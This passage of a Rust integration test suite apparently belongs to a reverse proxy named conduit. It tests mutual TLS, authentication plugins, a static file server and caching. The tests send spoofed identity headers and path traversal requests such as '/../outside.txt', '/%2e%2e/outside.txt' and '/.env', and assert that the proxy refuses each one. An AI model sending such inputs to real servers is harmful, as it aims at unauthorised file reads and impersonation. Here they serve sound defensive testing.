    let mut b = SslConnector::builder(SslMethod::tls()).unwrap();
    b.set_verify(SslVerifyMode::NONE);
    b.set_min_proto_version(Some(version)).unwrap();
    b.set_max_proto_version(Some(version)).unwrap();
    if let Some((c, k)) = cert {
        b.set_certificate(c).unwrap();
        b.set_private_key(k).unwrap();
    }
    let connector = b.build();
    let mut ssl = connector
        .configure()
        .unwrap()
        .verify_hostname(false)
        .into_ssl(sni)
        .unwrap();
    if let Some(s) = session {
        // SAFETY: a client session; OpenSSL only checks it against the protocol version.
        unsafe { ssl.set_session(s).unwrap() };
    }
    let tcp = TcpStream::connect(("127.0.0.1", port)).unwrap();
    tcp.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
    let mut stream = SslStream::new(ssl, tcp).unwrap();
    stream.connect().unwrap();
    stream
        .write_all(request("/", host, extra).as_bytes())
        .unwrap();
    // Read exactly one response, then take the session (a TLS 1.3 ticket has arrived by
    // then): OpenSSL marks a session unusable once the connection ends without close_notify.
    let resp = parse(&read_response(&mut stream));
    let session = stream.ssl().session().unwrap().to_owned();
    let _ = stream.shutdown();
    MtlsReply {
        resp,
        reused: stream.ssl().session_reused(),
        session,
    }
}

/// One HTTP/1.1 response with a Content-Length body.
fn read_response(s: &mut impl Read) -> Vec<u8> {
    let mut out = Vec::new();
    let mut buf = [0u8; 8192];
    loop {
        if let Some(end) = out.windows(4).position(|w| w == b"\r\n\r\n") {
            let len = parse(&out[..end + 4])
                .header("content-length")
                .and_then(|v| v.parse::<usize>().ok())
                .unwrap_or(0);
            if out.len() >= end + 4 + len {
                return out;
            }
        }
        match s.read(&mut buf) {
            Ok(0) | Err(_) => return out,
            Ok(n) => out.extend_from_slice(&buf[..n]),
        }
    }
}

#[test]
fn mutual_tls() {
    let dir = test_dir("mtls");
    let (upstream, _) = echo_upstream();
    let (http_port, https_port, admin) = (free_port(), free_port(), free_port());
    let ca = Ca::new("Client CA");
    let ca2 = Ca::new("Other CA");
    let ca_path = dir.join("ca.pem");
    std::fs::write(&ca_path, ca.cert.to_pem().unwrap()).unwrap();
    std::fs::write(dir.join("ca2.pem"), ca2.cert.to_pem().unwrap()).unwrap();
    let alice = ca.issue("alice", (-1, 30));
    let expired = ca.issue("old", (-30, -1));
    let mallory = ca2.issue("mallory", (-1, 30));
    let (cert, key) = self_signed(&dir, "server", &["*.mtls.test"]);
    let cfg_path = dir.join("conduit.yaml");
    std::fs::write(
        &cfg_path,
        format!(
            r#"
server:
  threads: 2
  shutdown_grace: 1s
  pid_file: {d}/conduit.pid
  upgrade_sock: {d}/upgrade.sock
listen:
  http: ["127.0.0.1:{http_port}"]
  https: ["127.0.0.1:{https_port}"]
admin:
  listen: "127.0.0.1:{admin}"
access_log:
  path: {d}/access.log
tls:
  watch_interval: 1s
  certs:
    - {{ name: server, cert: {cert}, key: {key} }}
sites:
  - {{ id: secure, hosts: [secure.mtls.test], upstream: "http://127.0.0.1:{upstream}", mtls: {{ ca: {d}/ca.pem }} }}
  - {{ id: opt, hosts: [opt.mtls.test], upstream: "http://127.0.0.1:{upstream}", mtls: {{ ca: {d}/ca.pem, optional: true }} }}
  - {{ id: other, hosts: [other.mtls.test], upstream: "http://127.0.0.1:{upstream}", mtls: {{ ca: {d}/ca2.pem }} }}
  - {{ id: open, hosts: [open.mtls.test], upstream: "http://127.0.0.1:{upstream}" }}
"#,
            d = dir.display(),
            cert = cert.display(),
            key = key.display(),
        ),
    )
    .unwrap();
    let _proxy = Proxy {
        child: spawn(&cfg_path, &[], "conduit.log"),
        dir: dir.clone(),
    };
    wait_for_port(https_port);
    let v13 = SslVersion::TLS1_3;
    let get = |sni: &str, host: &str, cert| mtls_get(https_port, sni, host, v13, cert, None, &[]);
    let fingerprint: String = alice
        .0
        .digest(MessageDigest::sha256())
        .unwrap()
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect();

    // Required: a certificate from the configured CA, verified; the upstream learns who it
    // is and cannot be told otherwise by the client.
    let r = get("secure.mtls.test", "secure.mtls.test", None).resp;
    assert_eq!(
        (r.status, r.body.as_str()),
        (403, "client certificate required\n")
    );
    let r = mtls_get(
        https_port,
        "secure.mtls.test",
        "secure.mtls.test",
        v13,
        Some(&alice),
        None,
        &[
            ("X-Client-Cert-Subject", "CN=admin"),
            ("X-Client-Verify", "SUCCESS"),
        ],
    )
    .resp;
    assert_eq!(r.status, 200, "{r:?}");
    assert!(
        r.body.contains("x-client-verify: success\r\n"),
        "{}",
        r.body
    );
    assert!(
        r.body
            .contains("x-client-cert-subject: cn=alice,o=conduit test\r\n"),
        "{}",
        r.body
    );
    assert!(
        r.body
            .contains(&format!("x-client-cert-fingerprint: {fingerprint}\r\n")),
        "{}",
        r.body
    );
    assert!(!r.body.contains("cn=admin"), "{}", r.body);
    let r = get("secure.mtls.test", "secure.mtls.test", Some(&mallory)).resp;
    assert_eq!(r.status, 403);
    assert!(
        r.body.starts_with("client certificate refused: unable to "),
        "{}",
        r.body
    );
    let r = get("secure.mtls.test", "secure.mtls.test", Some(&expired)).resp;
    assert_eq!(
        (r.status, r.body.as_str()),
        (403, "client certificate refused: certificate has expired\n")
    );
    assert_eq!(http(http_port, "secure.mtls.test", "/", &[]).status, 403);

    // optional: no certificate passes and says so; a bad one does not.
    let r = get("opt.mtls.test", "opt.mtls.test", None).resp;
    assert_eq!(r.status, 200);
    assert!(r.body.contains("x-client-verify: none\r\n"), "{}", r.body);
    assert!(
        get("opt.mtls.test", "opt.mtls.test", Some(&alice))
            .resp
            .body
            .contains("x-client-verify: success")
    );
    assert_eq!(
        get("opt.mtls.test", "opt.mtls.test", Some(&expired))
            .resp
            .status,
        403
    );

    // A connection set up for another host does not carry over, unless the CAs are the same.
    assert_eq!(
        get("open.mtls.test", "secure.mtls.test", Some(&alice))
            .resp
            .status,
        421
    );
    assert_eq!(
        get("secure.mtls.test", "other.mtls.test", Some(&alice))
            .resp
            .status,
        421
    );
    let r = get("secure.mtls.test", "opt.mtls.test", Some(&alice)).resp;
    assert!(r.body.contains("x-client-verify: success"), "{r:?}");
    assert_eq!(
        get("other.mtls.test", "other.mtls.test", Some(&mallory))
            .resp
            .status,
        200
    );
    assert_eq!(
        get("open.mtls.test", "open.mtls.test", None).resp.status,
        200
    );

    // HTTP/2 carries the connection's certificate to every stream.
    let alice_pem = dir.join("alice.pem");
    let mut pem = alice.0.to_pem().unwrap();
    pem.extend(alice.1.private_key_to_pem_pkcs8().unwrap());
    std::fs::write(&alice_pem, pem).unwrap();
    let out = Command::new("curl")
        .args([
            "-sk",
            "--http2",
            "-w",
            "\n%{http_code} %{http_version}",
            "--cert",
        ])
        .arg(&alice_pem)
        .arg("--resolve")
        .arg(format!("secure.mtls.test:{https_port}:127.0.0.1"))
        .arg(format!("https://secure.mtls.test:{https_port}/"))
        .output()
        .unwrap();
    let out = String::from_utf8_lossy(&out.stdout);
    assert!(out.ends_with("\n200 2"), "{out}");
    assert!(
        out.contains("x-client-cert-subject: cn=alice,o=conduit test"),
        "{out}"
    );

    // Sessions resume only under the CAs they were verified with, on TLS 1.2 and 1.3.
    for version in [SslVersion::TLS1_2, SslVersion::TLS1_3] {
        let get =
            |sni: &str, cert, session| mtls_get(https_port, sni, sni, version, cert, session, &[]);
        // Baseline: a site without mtls resumes its own sessions.
        let open = get("open.mtls.test", None, None);
        let r = get("open.mtls.test", None, Some(&open.session));
        assert!(r.reused, "{version:?}: no resumption at all");
        let first = get("secure.mtls.test", Some(&alice), None);
        assert!(!first.reused);
        // Same site: resumed, and the certificate comes from the session.
        let again = get("secure.mtls.test", None, Some(&first.session));
        assert!(again.reused, "{version:?}: session not resumed");
        assert!(
            again.resp.body.contains("x-client-cert-subject: cn=alice"),
            "{version:?} {:?}",
            again.resp
        );
        // A session from a site without mtls is not resumed here: no certificate, no entry.
        let r = get("secure.mtls.test", None, Some(&open.session));
        assert!(
            !r.reused,
            "{version:?}: open session resumed on an mtls site"
        );
        assert_eq!(r.resp.status, 403);
        // Nor a session verified against other CAs.
        let r = get("other.mtls.test", None, Some(&first.session));
        assert!(!r.reused, "{version:?}: session resumed under other CAs");
        assert_eq!(r.resp.status, 403);
        // A session made with a bad certificate stays bad.
        let bad = get("secure.mtls.test", Some(&expired), None);
        let r = get("secure.mtls.test", None, Some(&bad.session));
        assert_eq!(r.resp.status, 403, "{version:?}");
    }

    // Replacing the CA file: reloaded, older sessions are not resumed, the new CAs apply.
    let before = mtls_get(
        https_port,
        "secure.mtls.test",
        "secure.mtls.test",
        v13,
        Some(&alice),
        None,
        &[],
    );
    let mut both = ca.cert.to_pem().unwrap();
    both.extend(ca2.cert.to_pem().unwrap());
    std::fs::write(&ca_path, both).unwrap();
    wait_until("the CA file reload", Duration::from_secs(10), || {
        get("secure.mtls.test", "secure.mtls.test", Some(&mallory))
            .resp
            .status
            == 200
    });
    let r = mtls_get(
        https_port,
        "secure.mtls.test",
        "secure.mtls.test",
        v13,
        None,
        Some(&before.session),
        &[],
    );
    assert!(!r.reused, "a session from before the CA change was resumed");
    assert_eq!(r.resp.status, 403);

    wait_until("the access log", Duration::from_secs(5), || {
        std::fs::read_to_string(dir.join("access.log"))
            .unwrap_or_default()
            .contains("\"blocked_by\":\"mtls\"")
    });
}

/// An auth service in the style of Authelia: `Cookie: session=alice` passes with
/// `Remote-User` and `Remote-Groups`, `session=nogroups` passes with `Remote-User` only,
/// anything else is sent to a login page. Keeps the last request head it saw.
fn auth_service() -> (u16, Arc<std::sync::Mutex<String>>) {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let seen = Arc::new(std::sync::Mutex::new(String::new()));
    let last = seen.clone();
    thread::spawn(move || {
        for stream in listener.incoming().flatten() {
            let last = last.clone();
            thread::spawn(move || {
                let mut reader = BufReader::new(stream.try_clone().unwrap());
                let mut stream = stream;
                loop {
                    let mut head = String::new();
                    loop {
                        let mut line = String::new();
                        if reader.read_line(&mut line).unwrap_or(0) == 0 {
                            return;
                        }
                        if line == "\r\n" {
                            break;
                        }
                        head.push_str(&line);
                    }
                    let lower = head.to_ascii_lowercase();
                    *last.lock().unwrap() = lower.clone();
                    let resp = if lower.contains("cookie: session=alice") {
                        "HTTP/1.1 200 OK\r\nRemote-User: alice\r\nRemote-Groups: admins\r\nContent-Length: 0\r\n\r\n".to_string()
                    } else if lower.contains("cookie: session=nogroups") {
                        "HTTP/1.1 204 No Content\r\nRemote-User: bob\r\n\r\n".to_string()
                    } else {
                        let body = "login first";
                        format!(
                            "HTTP/1.1 302 Found\r\nLocation: https://login.test/?rd=x\r\nSet-Cookie: a=1; Path=/\r\nSet-Cookie: b=2; Path=/\r\nContent-Type: text/plain\r\nContent-Length: {}\r\n\r\n{body}",
                            body.len()
                        )
                    };
                    if stream.write_all(resp.as_bytes()).is_err() {
                        return;
                    }
                }
            });
        }
    });
    (port, seen)
}

#[test]
fn auth_plugins() {
    let dir = test_dir("auth");
    let (upstream, _) = echo_upstream();
    let (auth, seen) = auth_service();
    let (http_port, admin) = (free_port(), free_port());
    let hash = bcrypt::hash("wonderland", 4).unwrap();
    let cfg_path = dir.join("conduit.yaml");
    std::fs::write(
        &cfg_path,
        format!(
            r#"
server:
  threads: 2
  shutdown_grace: 1s
  pid_file: {d}/conduit.pid
  upgrade_sock: {d}/upgrade.sock
listen:
  http: ["127.0.0.1:{http_port}"]
admin:
  listen: "127.0.0.1:{admin}"
access_log:
  path: {d}/access.log
real_ip:
  header: X-Real-IP
  trusted: [127.0.0.1/32]
sites:
  - id: basic
    hosts: [basic.auth.test]
    upstream: http://127.0.0.1:{upstream}
    plugins:
      - basic_auth:
          users: {{ alice: "{hash}" }}
          match: {{ path: {{ prefix: /private }} }}
      - rules:
          - match: {{ path: {{ exact: /private/file }} }}
            action: {{ respond: {{ status: 200, body: "secret file" }} }}
  - id: fwd
    hosts: [fwd.auth.test]
    upstream: http://127.0.0.1:{upstream}
    plugins:
      - forward_auth:
          url: http://127.0.0.1:{auth}/api/verify
          copy_headers: [Remote-User, Remote-Groups]
  - id: down
    hosts: [down.auth.test]
    upstream: http://127.0.0.1:{upstream}
    plugins:
      - forward_auth: {{ url: "http://127.0.0.1:1/verify", timeout: 1s }}
"#,
            d = dir.display()
        ),
    )
    .unwrap();
    let _proxy = Proxy {
        child: spawn(&cfg_path, &[], "conduit.log"),
        dir: dir.clone(),
    };
    wait_for_port(http_port);
    let b64 = |s: &str| {
        use base64::Engine as _;
        format!(
            "Basic {}",
            base64::engine::general_purpose::STANDARD.encode(s)
        )
    };

    // basic_auth, only under /private; a rule after it is reached only with the password.
    assert_eq!(
        http(http_port, "basic.auth.test", "/public", &[]).status,
        200
    );
    for path in ["/private/x", "/private/file"] {
        let r = http(http_port, "basic.auth.test", path, &[]);
        assert_eq!(r.status, 401, "{path}");
        assert_eq!(
            r.header("www-authenticate"),
            Some("Basic realm=\"restricted\", charset=\"UTF-8\"")
        );
    }
    for wrong in ["alice:nope", "mallory:wonderland"] {
        let auth = b64(wrong);
        let r = http(
            http_port,
            "basic.auth.test",
            "/private/file",
            &[("Authorization", &auth)],
        );
        assert_eq!(r.status, 401, "{wrong}");
    }
    let good = b64("alice:wonderland");
    let r = http(
        http_port,
        "basic.auth.test",
        "/private/file",
        &[("Authorization", &good)],
    );
    assert_eq!((r.status, r.body.as_str()), (200, "secret file"));
    let r = http(
        http_port,
        "basic.auth.test",
        "/private/x",
        &[("Authorization", &good)],
    );
    assert_eq!(r.status, 200);
    assert!(r.body.starts_with("get /private/x http/1.1"), "{}", r.body);

    // forward_auth: no session -> the auth service's answer, as it is.
    let r = http(
        http_port,
        "fwd.auth.test",
        "/app?x=1",
        &[("X-Real-IP", "198.51.100.4"), ("X-Forwarded-Uri", "/evil")],
    );
    assert_eq!(r.status, 302, "{r:?}");
    assert_eq!(r.header("location"), Some("https://login.test/?rd=x"));
    let cookies: Vec<_> = r
        .headers
        .iter()
        .filter(|(k, _)| k.eq_ignore_ascii_case("set-cookie"))
        .map(|(_, v)| v.as_str())
        .collect();
    assert_eq!(cookies, ["a=1; Path=/", "b=2; Path=/"]);
    assert_eq!(r.body, "login first");
    let asked = seen.lock().unwrap().clone();
    assert!(asked.starts_with("get /api/verify http/1.1\r\n"), "{asked}");
    for line in [
        "x-forwarded-method: get\r\n",
        "x-forwarded-uri: /app?x=1\r\n",
        "x-forwarded-host: fwd.auth.test\r\n",
        "x-forwarded-proto: http\r\n",
        "x-forwarded-for: 198.51.100.4\r\n",
    ] {
        assert!(asked.contains(line), "missing {line:?} in {asked}");
    }
    assert!(!asked.contains("/evil"), "{asked}");

    // A session: through, with the auth service's headers and never the client's own.
    let r = http(
        http_port,
        "fwd.auth.test",
        "/app",
        &[("Cookie", "session=alice"), ("Remote-User", "mallory")],
    );
    assert_eq!(r.status, 200);
    assert!(r.body.contains("remote-user: alice\r\n"), "{}", r.body);
    assert!(r.body.contains("remote-groups: admins\r\n"), "{}", r.body);
    assert!(!r.body.contains("mallory"), "{}", r.body);
    let r = http(
        http_port,
        "fwd.auth.test",
        "/app",
        &[("Cookie", "session=nogroups"), ("Remote-Groups", "admins")],
    );
    assert_eq!(r.status, 200);
    assert!(r.body.contains("remote-user: bob\r\n"), "{}", r.body);
    assert!(!r.body.contains("remote-groups"), "{}", r.body);
    // The body is not touched by the check: it reaches the upstream whole.
    let raw = b"POST /upload HTTP/1.1\r\nHost: fwd.auth.test\r\nCookie: session=alice\r\nContent-Length: 11\r\nConnection: close\r\n\r\nhello world";
    let r = exchange(http_port, raw).unwrap();
    assert_eq!(r.status, 200);
    assert!(r.body.ends_with("\r\nhello world"), "{}", r.body);
    assert!(
        seen.lock()
            .unwrap()
            .contains("x-forwarded-method: post\r\n")
    );

    // The auth service is down: refused, not let through.
    assert_eq!(http(http_port, "down.auth.test", "/", &[]).status, 502);

    let m = http(admin, "localhost", "/metrics", &[]).body;
    let n = |site: &str, plugin: &str, result: &str| {
        let (s, p, res) = (
            format!("site=\"{site}\""),
            format!("plugin=\"{plugin}\""),
            format!("result=\"{result}\""),
        );
        metric(&m, "conduit_auth_requests_total", &[&s, &p, &res])
    };
    assert_eq!(n("basic", "basic_auth", "deny"), Some(4.0));
    assert_eq!(n("basic", "basic_auth", "allow"), Some(2.0));
    assert_eq!(n("fwd", "forward_auth", "allow"), Some(3.0));
    assert_eq!(n("fwd", "forward_auth", "deny"), Some(1.0));
    assert_eq!(n("down", "forward_auth", "error"), Some(1.0));
    wait_until("the access log", Duration::from_secs(5), || {
        let log = std::fs::read_to_string(dir.join("access.log")).unwrap_or_default();
        log.contains("\"blocked_by\":\"basic_auth\"")
            && log.contains("\"blocked_by\":\"forward_auth\"")
    });
}

/// Send a raw request (it should ask for `Connection: close`) and parse the answer.
fn raw_http(port: u16, req: &str) -> Resp {
    let mut s = TcpStream::connect(("127.0.0.1", port)).unwrap();
    s.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
    s.write_all(req.as_bytes()).unwrap();
    parse(&read_all(&mut s))
}

#[test]
fn file_server() {
    let dir = test_dir("files");
    let www = dir.join("www");
    std::fs::create_dir_all(www.join("sub")).unwrap();
    std::fs::create_dir_all(www.join("static")).unwrap();
    std::fs::write(www.join("index.html"), b"<h1>home</h1>").unwrap();
    std::fs::write(www.join("sub/index.html"), b"sub home").unwrap();
    std::fs::write(www.join(".env"), b"SECRET=1").unwrap();
    std::fs::write(dir.join("outside.txt"), b"outside").unwrap();
    std::os::unix::fs::symlink(dir.join("outside.txt"), www.join("escape.txt")).unwrap();
    std::fs::write(www.join("style.css"), b"body { color: red }").unwrap();
    std::fs::write(www.join("style.css.br"), b"BROTLI-BYTES").unwrap();
    std::fs::write(www.join("static/app.js"), b"console.log('app')").unwrap();
    // Bigger than one 128 KiB read, so it is streamed in pieces.
    let big: String = (0..30_000).map(|i| format!("{i:09}\n")).collect();
    std::fs::write(www.join("big.txt"), &big).unwrap();
    let (upstream, _) = echo_upstream();
    let (http_port, admin) = (free_port(), free_port());
    let cfg_path = dir.join("conduit.yaml");
    std::fs::write(
        &cfg_path,
        format!(
            r#"
server:
  threads: 2
  shutdown_grace: 1s
  pid_file: {d}/conduit.pid
  upgrade_sock: {d}/upgrade.sock
listen:
  http: ["127.0.0.1:{http_port}"]
admin:
  listen: "127.0.0.1:{admin}"
access_log:
  path: {d}/access.log
sites:
  - id: static
    hosts: [static.test]
    files:
      root: {d}/www
      precompressed: [br, gzip]
  - id: spa
    hosts: [spa.test]
    files:
      root: {d}/www
      try_files: ["{{path}}", "/index.html"]
  - id: mixed
    hosts: [mixed.test]
    upstream: http://127.0.0.1:{upstream}
    files:
      root: {d}/www/static
      match: {{ path: {{ prefix: /assets/ }} }}
      strip_prefix: /assets
      pass_thru: true
"#,
            d = dir.display()
        ),
    )
    .unwrap();
    let _proxy = Proxy {
        child: spawn(&cfg_path, &[], "conduit.log"),
        dir: dir.clone(),
    };
    wait_for_port(http_port);
    let get = |host: &str, path: &str, extra: &[(&str, &str)]| http(http_port, host, path, extra);

    // The index, with validators and a type.
    let r = get("static.test", "/", &[]);
    assert_eq!((r.status, r.body.as_str()), (200, "<h1>home</h1>"), "{r:?}");
    assert_eq!(r.header("content-type"), Some("text/html; charset=utf-8"));
    let etag = r.header("etag").expect("etag").to_string();
    let modified = r
        .header("last-modified")
        .expect("last-modified")
        .to_string();
    assert_eq!(r.header("accept-ranges"), Some("bytes"));

    // Conditionals.
    let r = get("static.test", "/", &[("If-None-Match", &etag)]);
    assert_eq!((r.status, r.body.as_str()), (304, ""), "{r:?}");
    let r = get("static.test", "/", &[("If-Modified-Since", &modified)]);
    assert_eq!(r.status, 304);
    let r = get("static.test", "/", &[("If-Match", "\"other\"")]);
    assert_eq!(r.status, 412);

    // Ranges, and they are never compressed.
    let r = get(
        "static.test",
        "/big.txt",
        &[("Range", "bytes=10-19"), ("Accept-Encoding", "gzip")],
    );
    assert_eq!(r.status, 206, "{r:?}");
    assert_eq!(r.body, "000000001\n");
    assert_eq!(
        r.header("content-range"),
        Some(format!("bytes 10-19/{}", big.len()).as_str())
    );
    assert_eq!(r.header("content-encoding"), None);
    let r = get("static.test", "/big.txt", &[("Range", "bytes=999999999-")]);
    assert_eq!(r.status, 416);
    assert_eq!(
        r.header("content-range"),
        Some(format!("bytes */{}", big.len()).as_str())
    );
    // If-Range with an old validator sends the whole file.
    let r = get(
        "static.test",
        "/big.txt",
        &[("Range", "bytes=0-1"), ("If-Range", "\"old\"")],
    );
    assert_eq!(r.status, 200);

    // Large files stream whole; compression applies to whole text responses.
    let r = get("static.test", "/big.txt", &[]);
    assert_eq!(r.status, 200);
    assert_eq!(r.body.len(), big.len());
    assert!(r.body == big);
    let r = get("static.test", "/big.txt", &[("Accept-Encoding", "gzip")]);
    assert_eq!(r.status, 200);
    assert_eq!(r.header("content-encoding"), Some("gzip"));
    assert!(
        r.header("etag").is_some_and(|e| e.starts_with("W/")),
        "{:?}",
        r.header("etag")
    );
    // Each encoding ends as a complete stream that a strict decoder takes whole. Pingora 0.9.1
    // left brotli without its last meta-block (fixed in the fork, from upstream PR #1021).
    for enc in ["br", "zstd", "gzip"] {
        let mut conn = BufReader::new(TcpStream::connect(("127.0.0.1", http_port)).unwrap());
        conn.get_ref()
            .set_read_timeout(Some(Duration::from_secs(10)))
            .unwrap();
        let req =
            format!("GET /big.txt HTTP/1.1\r\nHost: static.test\r\nAccept-Encoding: {enc}\r\n\r\n");
        let a = keepalive_exchange(&mut conn, req.as_bytes()).unwrap();
        assert_eq!(a.status, 200, "{enc}");
        assert!(
            a.body.len() < big.len() / 2,
            "{enc}: {} bytes",
            a.body.len()
        );
        let mut plain = Vec::new();
        match enc {
            "br" => brotli::BrotliDecompress(&mut &a.body[..], &mut plain).map(|_| ()),
            "zstd" => zstd::stream::copy_decode(&a.body[..], &mut plain),
            _ => flate2::read::GzDecoder::new(&a.body[..])
                .read_to_end(&mut plain)
                .map(|_| ()),
        }
        .unwrap_or_else(|e| panic!("{enc}: {e}"));
        assert!(
            plain == big.as_bytes(),
            "{enc}: {} bytes decoded",
            plain.len()
        );
    }

    // HEAD: headers only.
    let r = raw_http(
        http_port,
        "HEAD /big.txt HTTP/1.1\r\nHost: static.test\r\nConnection: close\r\n\r\n",
    );
    assert_eq!(r.status, 200);
    assert_eq!(
        r.header("content-length"),
        Some(big.len().to_string().as_str())
    );
    assert_eq!(r.body, "");

    // Precompressed siblings, chosen by Accept-Encoding.
    let r = get(
        "static.test",
        "/style.css",
        &[("Accept-Encoding", "gzip, br")],
    );
    assert_eq!((r.status, r.body.as_str()), (200, "BROTLI-BYTES"));
    assert_eq!(r.header("content-encoding"), Some("br"));
    assert_eq!(r.header("content-type"), Some("text/css; charset=utf-8"));
    assert_eq!(r.header("vary"), Some("Accept-Encoding"));
    let r = get("static.test", "/style.css", &[]);
    assert_eq!((r.status, r.body.as_str()), (200, "body { color: red }"));
    assert_eq!(r.header("content-encoding"), None);

    // Canonical URLs.
    let r = get("static.test", "/sub?x=1", &[]);
    assert_eq!((r.status, r.header("location")), (308, Some("/sub/?x=1")));
    assert_eq!(get("static.test", "/sub/", &[]).body, "sub home");
    let r = get("static.test", "//sub", &[]);
    assert_eq!((r.status, r.header("location")), (308, Some("/sub/")));
    let r = get("static.test", "/style.css/", &[]);
    assert_eq!((r.status, r.header("location")), (308, Some("/style.css")));

    // Confinement: dotfiles, encoded traversal and symlinks out of the root.
    for path in ["/.env", "/%2eenv", "/escape.txt", "/nope"] {
        assert_eq!(get("static.test", path, &[]).status, 404, "{path}");
    }
    // Climbing above the root is refused before any lookup.
    for path in ["/../outside.txt", "/%2e%2e/outside.txt"] {
        assert_eq!(get("static.test", path, &[]).status, 400, "{path}");
    }
    // Only GET and HEAD on a site without an upstream.
    let r = raw_http(
        http_port,
        "POST / HTTP/1.1\r\nHost: static.test\r\nContent-Length: 2\r\nConnection: close\r\n\r\nhi",
    );
    assert_eq!((r.status, r.header("allow")), (405, Some("GET, HEAD")));

    // try_files: a single-page app's routes fall back to the index.
    assert_eq!(get("spa.test", "/some/route", &[]).body, "<h1>home</h1>");
    assert_eq!(
        get("spa.test", "/style.css", &[]).body,
        "body { color: red }"
    );

    // Files under a prefix, the upstream for the rest and for files that are missing.
    assert_eq!(
        get("mixed.test", "/assets/app.js", &[]).body,
        "console.log('app')"
    );
    let r = get("mixed.test", "/assets/missing.js", &[]);
    assert!(r.body.starts_with("get /assets/missing.js "), "{r:?}");
    let r = get("mixed.test", "/api/x", &[]);
    assert!(r.body.starts_with("get /api/x "), "{r:?}");

    let s = status_json(admin);
    let site = s["sites"]
        .as_array()
        .unwrap()
        .iter()
        .find(|s| s["id"] == "static")
        .unwrap();
    assert_eq!(site["upstream"], serde_json::Value::Null);
    assert!(site["files"].as_str().is_some_and(|f| f.ends_with("/www")));
}

/// An upstream for cache tests: what it answers depends on the path, and it counts the
/// requests for each path. While `down` is set it drops every connection.
type Counts = Arc<std::sync::Mutex<HashMap<String, usize>>>;

fn cache_upstream() -> (u16, Counts, Arc<std::sync::atomic::AtomicBool>) {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let seen = Arc::new(std::sync::Mutex::new(HashMap::new()));
    let down = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let (s, d) = (seen.clone(), down.clone());
    thread::spawn(move || {
        for stream in listener.incoming().flatten() {
            let (seen, down) = (s.clone(), d.clone());
            thread::spawn(move || serve_cacheable(stream, &seen, &down));
        }
    });
    (port, seen, down)
}

fn serve_cacheable(
    mut stream: TcpStream,
    seen: &std::sync::Mutex<HashMap<String, usize>>,
    down: &std::sync::atomic::AtomicBool,
) {
    let mut reader = BufReader::new(stream.try_clone().unwrap());
    loop {
        let mut head = Vec::new();
        loop {
            let mut line = String::new();
            if reader.read_line(&mut line).unwrap_or(0) == 0 {
                return;
            }
            if line == "\r\n" {
                break;
            }
            head.push(line.trim_end().to_string());
        }
        if down.load(Ordering::SeqCst) {
            return;
        }
        let target = head[0].split(' ').nth(1).unwrap_or("/").to_string();
        let path = target.split('?').next().unwrap().to_string();
        let field = |name: &str| {
            head.iter()
                .find_map(|l| {
                    let (k, v) = l.split_once(':')?;
                    k.eq_ignore_ascii_case(name).then(|| v.trim().to_string())
                })
                .unwrap_or_default()
        };
        let lang = field("x-lang");
        let n = {
            let mut seen = seen.lock().unwrap();
            let n = seen.entry(path.clone()).or_insert(0);
            *n += 1;
            *n
        };
        let mut headers = String::from("Content-Type: text/plain\r\n");
        let mut body = format!("{target} #{n}");
        let name = path.trim_start_matches('/');
        let name = name.split('/').next().unwrap_or("");
        match name {
            "fresh" | "auth" => headers.push_str("Cache-Control: max-age=60\r\n"),
            "cookie" => {
                headers.push_str("Cache-Control: max-age=60\r\nSet-Cookie: session=abc\r\n")
            }
            "private" => headers.push_str("Cache-Control: private, max-age=60\r\n"),
            "vary" => {
                headers.push_str("Cache-Control: max-age=60\r\nVary: X-Lang\r\n");
                body = format!("lang={lang} #{n}");
            }
            "sie" => headers.push_str("Cache-Control: max-age=1, stale-if-error=60\r\n"),
            "swr" => headers.push_str("Cache-Control: max-age=1, stale-while-revalidate=60\r\n"),
            "slow" => {
                thread::sleep(Duration::from_millis(500));
                headers.push_str("Cache-Control: max-age=60\r\n");
            }
            "big" => {
                headers.push_str("Cache-Control: max-age=60\r\n");
                body = "x".repeat(4096);
            }
            "etag" if field("if-none-match") == "\"v1\"" => {
                let resp =
                    "HTTP/1.1 304 Not Modified\r\nCache-Control: max-age=1\r\nETag: \"v1\"\r\n\r\n";
                if stream.write_all(resp.as_bytes()).is_err() {
                    return;
                }
                continue;
            }
            "etag" => headers.push_str("Cache-Control: max-age=1\r\nETag: \"v1\"\r\n"),
            // Encoded only for clients that take gzip, as many upstreams do.
            "gz" => {
                headers.push_str("Cache-Control: max-age=60\r\n");
                if field("accept-encoding").contains("gzip") {
                    headers.push_str("Content-Encoding: gzip\r\n");
                    body = format!("GZIP #{n}");
                }
            }
            _ => {} // "plain": nothing about caching
        }
        let resp = format!(
            "HTTP/1.1 200 OK\r\n{headers}Content-Length: {}\r\n\r\n{body}",
            body.len()
        );
        if stream.write_all(resp.as_bytes()).is_err() {
            return;
        }
    }
}

#[test]
fn response_cache() {
    let dir = test_dir("cache");
    let (upstream, seen, down) = cache_upstream();
    let (http_port, admin) = (free_port(), free_port());
    let cfg_path = dir.join("conduit.yaml");
    std::fs::write(
        &cfg_path,
        format!(
            r#"
server:
  threads: 2
  shutdown_grace: 1s
  pid_file: {d}/conduit.pid
  upgrade_sock: {d}/upgrade.sock
listen:
  http: ["127.0.0.1:{http_port}"]
admin:
  listen: "127.0.0.1:{admin}"
access_log:
  path: {d}/access.log
cache:
  max_object_size: 1k
real_ip:
  header: X-Real-IP
  trusted: [127.0.0.1/32]
sites:
  - id: cached
    hosts: [cache.test]
    upstream: {{ backends: ["http://127.0.0.1:{upstream}"], retries: 0 }}
    cache: true
  - id: ttl
    hosts: [ttl.test]
    upstream: http://127.0.0.1:{upstream}
    cache: {{ default_ttl: 1m }}
  - id: nocache
    hosts: [nocache.test]
    upstream: http://127.0.0.1:{upstream}
"#,
            d = dir.display()
        ),
    )
    .unwrap();
    let _proxy = Proxy {
        child: spawn(&cfg_path, &[], "conduit.log"),
        dir: dir.clone(),
    };
    wait_for_port(http_port);
    let get = |host: &str, path: &str, extra: &[(&str, &str)]| http(http_port, host, path, extra);
    let count = |path: &str| seen.lock().unwrap().get(path).copied().unwrap_or(0);

    // A miss is stored, then served from memory.
    let r = get("cache.test", "/fresh", &[]);
    assert_eq!((r.status, r.body.as_str()), (200, "/fresh #1"), "{r:?}");
